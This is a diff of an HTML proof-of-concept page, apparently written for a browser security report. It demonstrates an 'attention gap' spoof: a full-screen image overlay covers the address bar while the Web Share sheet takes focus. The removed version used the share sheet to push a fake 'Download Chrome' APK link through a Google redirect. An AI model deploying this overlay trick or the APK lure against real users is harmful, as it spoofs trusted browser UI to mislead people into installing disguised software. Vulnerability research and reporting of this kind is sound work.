@@ -1,26 +1,89 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Attention Gap PoC – Overlay + Web Share</title>
+
+<style>
+  body {
+    margin: 0;
+    font-family: sans-serif;
+    height: 200vh; /* biar kelihatan ini halaman web */
+    background: #111;
+    color: #fff;
+  }
+
+  button {
+    margin: 40px;
+    padding: 16px 22px;
+    font-size: 18px;
+  }
+
+  /* Overlay image (visual only) */
+  #overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    background: url("spoof.png") no-repeat top center;
+    background-size: cover;
+    z-index: 9999;
+    display: none;
+    pointer-events: none; /* tidak intercept tap */
+  }
+
+  #state {
+    margin: 40px;
+    font-size: 14px;
+    opacity: 0.8;
+  }
+</style>
+</head>
+
 <body>
 
-<input
-  type="button"
-  value="Click Call Center"
-  onclick="
-  /* 1️⃣ Trusted system UI (Web Share) */
+<button id="btn">Tap (Web Share)</button>
+<div id="state">State: idle</div>
+
+<div id="overlay"></div>
+
+<script>
+const btn = document.getElementById('btn');
+const overlay = document.getElementById('overlay');
+const state = document.getElementById('state');
+
+btn.onclick = () => {
+  /* 1️⃣ Show visual overlay (covers omnibar visually) */
+  overlay.style.display = 'block';
+
+  /* 2️⃣ Trusted system UI */
   if (navigator.share) {
     navigator.share({
-      title: 'Click To Download Chrome',
-
-      url: 'https://www.google.com/url?q=https://ecdnts-del.github.io/test-apk/chrome.apk'
+      title: 'UX Research Demo',
+      text: 'System share sheet temporarily takes focus',
+      url: location.href
     }).catch(()=>{});
   }
 
-  /* 2️⃣ State change / navigation after attention gap */
-  setTimeout(function() {
-    location.href = 'https://google.com';
-  }, 800);
-  "
->
+  /* 3️⃣ State change while attention is diverted */
+  setTimeout(() => {
+    state.textContent =
+      'State: changed while system UI was visible';
+  }, 500);
+
+  /* 4️⃣ Cleanup */
+  setTimeout(() => {
+    overlay.style.display = 'none';
+  }, 1500);
+};
+
+/* Observability (optional, good for report) */
+document.addEventListener('visibilitychange', () => {
+  console.log('visibility:', document.visibilityState);
+});
+</script>
 
 </body>
 </html>
